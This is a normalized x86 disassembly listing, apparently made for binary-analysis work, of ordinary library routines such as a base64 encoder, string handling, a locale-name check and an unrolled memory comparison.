lea edx [ edx + edx * 2 ]
xor ebx ebx
test edx edx
je r-xdata
pop edi
mov [ eax ] edx
mov eax 0xffffffd6
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
inc edx
cmp [ eax ] edx
jae r-xdata
add edx 0x2
jmp r-xdata
cmp ebx edi
jae r-xdata
dec edx
mov eax 0xaaaaaaab
mul edx
shr edx 0x1
inc edx
mov [ ebp - 0x4 ] edx
lea edx [ edx + edx * 2 ]
mov [ ebp - 0x8 ] edx
lea ebx [ ebx ]
mov edx [ ebp + 0xc ]
mov eax ecx
sub eax [ ebp + 0x8 ]
pop ebx
mov [ edx ] eax
mov [ ecx ] 0x0
movzx eax [ esi ]
lea edx [ ebx + 0x1 ]
cmp edx edi
jae r-xdata
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
movzx edi [ esi + 0x2 ]
mov ebx eax
sar ebx 0x2
and ebx 0x3f
mov bl [ ebx + r--data ]
mov [ ecx ] bl
mov ebx edx
shl eax 0x4
sar ebx 0x4
add ebx eax
and ebx 0x3f
movzx eax [ ebx + r--data ]
mov [ ecx + 0x1 ] al
mov eax edi
sar eax 0x6
lea edx [ eax + edx * 4 ]
and edx 0x3f
movzx eax [ edx + r--data ]
mov [ ecx + 0x2 ] al
and edi 0x3f
mov dl [ edi + r--data ]
mov [ ecx + 0x3 ] dl
add esi 0x3
add ecx 0x4
dec [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x10 ]
mov ebx [ ebp - 0x8 ]
xor esi esi
movzx esi [ esi + 0x1 ]
jmp r-xdata
mov [ ecx + 0x2 ] 0x3d
and esi 0xf
mov dl [ esi * 4 + r--data ]
mov [ ecx + 0x2 ] dl
jmp r-xdata
mov ebx eax
sar ebx 0x2
and ebx 0x3f
mov bl [ ebx + r--data ]
mov [ ecx ] bl
mov ebx esi
sar ebx 0x4
shl eax 0x4
add ebx eax
and ebx 0x3f
mov al [ ebx + r--data ]
mov [ ecx + 0x1 ] al
cmp edx edi
jae r-xdata
add ecx 0x3
mov [ ecx ] 0x3d
inc ecx
sub_100040f4
push 0x4
mov eax sub_10085c13
call sub_100624bc
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_1006808e
mov eax esi
call sub_10013ab8
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_100588e2
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_1006808e
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_10004190
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_10057f6e
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1006299d
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_100041c3
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_1007fa90
lea esi [ eax + 0x1 ]
push esi
call sub_1000b33e
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_10004215
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
jmp r-xdata
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp edx [ ebp + 0xc ]
setne al
movzx eax [ edx ]
movzx ecx [ esi ]
cmp cx ax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jb r-xdata
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
add edx 0x2
add esi 0x2
sub_1000425a
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_10044649
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_1007fa90
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_100232aa
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_10037a3e
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1006470e
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_1007f5d0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_1007f5d0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
call sub_1003cbb0
sub_100044b8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_1000598c ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
